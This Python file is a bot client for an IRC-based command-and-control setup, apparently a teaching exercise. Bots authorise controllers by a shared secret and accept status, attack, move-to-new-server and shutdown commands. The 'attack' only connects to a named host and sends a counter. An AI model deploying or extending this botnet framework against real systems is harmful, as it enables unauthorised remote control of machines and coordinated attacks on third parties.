import socketserver
import socket, threading
import sys
from collections import deque
import time
import string
import random
import select
import errno
from socket import error as socket_error

# Function to send message to controller
def sendPrivMSG(target,message):
    global client
    client.send(('PRIVMSG ' + target + ' :'+message +'\n').encode('utf-8'))

# Function for each bot to send the controller its name
def do_status(args, id, controller):
    sendPrivMSG(controller,'bot'+id)

# Function for bots to attack a specified host
def do_attack(args, id, controller):
    global counter
    
    # Connect to the specified host at the specified port number
    botClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        botClient.connect((args[1],int(args[2])))
        
        # Send a counter and the bots name to the attacked host and increase the counter
        botClient.send((str(counter)+' '+'bot'+id+'\n').encode('utf-8'))
        counter += 1
        
        # Report back to the controller
        sendPrivMSG(controller, 'bot'+id+': attack successful')
        botClient.close()
    except socket.error:
        sendPrivMSG(controller, 'bot'+id+': attack unsuccessful, connection refused')

# Function for bots to switch server
def do_move(args, id, controller):
    global client
    global authorizedControllers

    for _ in range(5):
        try:
            # Connect to the new server on the specified port or try again if refused
            newClient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            newClient.connect((args[1],int(args[2])))
        except socket.error:
            print('Connection refused. Trying again...')
            continue
        print('Connected')
        while True:
            # send a unique NICK or handle Nick collisions
            newClient.send(('NICK bot'+id+'\n').encode('utf-8'))
            try:
                newClient.settimeout(4)
                data = newClient.recv(1024).decode('utf-8')
                if not data == 'ERR_NICKNAMEINUSE':
                    break
            except socket.timeout:
                break
            id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
        newClient.settimeout(None)
        
        # Create a new user on the new IRC server
        newClient.send(('USER bot * * :Bot BotMacBotFace\n').encode('utf-8'))
        data = newClient.recv(1024).decode('utf-8')
        if not '001' in data:
            print('You are not welcome')
            continue
        
        # Join the specified channel
        newClient.send(('JOIN '+args[3][1:]+'\n').encode('utf-8'))
        data = newClient.recv(1024).decode('utf-8')
        print(data)
        if not '331' in data and not '332' in data:
            print('Could not connect to channel')
            continue
        else:
            # Report back to the server
            print('Joined new channel')
            sendPrivMSG(controller, 'bot'+id+': move successful')
            
            # Quit the previous channel and close the previous socket
            client.send(('JOIN 0' + '\n').encode('utf-8'))
            client.send(('QUIT\n').encode('utf-8'))
            client.detach()
            client = newClient
            authorizedControllers = []
            return

# Handle the quit action of the controller by removing the specified controller from the authorized controller list
def do_quit(args, id, controller):
    global authorizedControllers
    authorizedControllers.remove(controller)

# Shutdown the bot
def do_shutdown(args, id, controller):
    global client
    # inform the controller that you are shuttingdown
    sendPrivMSG(controller, 'bot'+id+': disconnected')
    # Quit the channel, close the socket and exit
    client.send(('QUIT\n').encode('utf-8'))
    client.close()
    sys.exit()

# Structure so that the program can look into to decide which method to call based on user specified argument
interpretInput = {
    'status':do_status,
    'attack':do_attack,
    'move':do_move,
    'quit':do_quit,
    'shutdown':do_shutdown
}

authorizedControllers = []
controller = ''
counter = 0
client = ''

if __name__ == "__main__":
    
    # getting the arguments when server is running with no options
    HOST = sys.argv[1]
    srcPort = int(sys.argv[2])
    channel = sys.argv[3][1:]
    secret = sys.argv[4]
    while True:
        # connect to the specified host on the specified port
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST,srcPort))
        while True:
            # generate a unique Nick or try again on Nick collision
            id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
            client.send(('NICK bot'+id+'\n').encode('utf-8'))
            try:
                client.settimeout(4)
                data = client.recv(128).decode('utf-8')
                if not '433' in data:
                    break
            except socket.timeout:
                break

        client.settimeout(None)
        # create a new user on the IRC server
        client.send(('USER bot * * :Bot BotMacBotFace\n').encode('utf-8'))
        data = client.recv(1024).decode('utf-8')
        if not '001' in data:
            print('You are not welcome')
            continue
        
        # Join the specified channel
        client.send(('JOIN '+channel+'\n').encode('utf-8'))
        data = client.recv(1024).decode('utf-8')


        while True:
            # Get input from controller and interpret commands accordingly
            data = client.recv(1024).decode('utf-8')
            lines = data.split('\n')
            for line in lines:
                messages = line.split(':')

                if len(messages) < 3:
                    continue
                else:
                    message = messages[2].strip()
                
                controller = messages[1].split('!')[0].strip()
                if controller in authorizedControllers:
                    print("Accepting command from " + controller)
                    args = message.split()
                    if not args[0] in interpretInput:
                        print("No such command\n")
                    else:
                        interpretInput[args[0]](args,id,controller)
                else:
                    if message == secret:
                        print(controller + " authorized")
                        authorizedControllers.append(controller)
                    else:
                        print(controller + " not authorized")
                        break


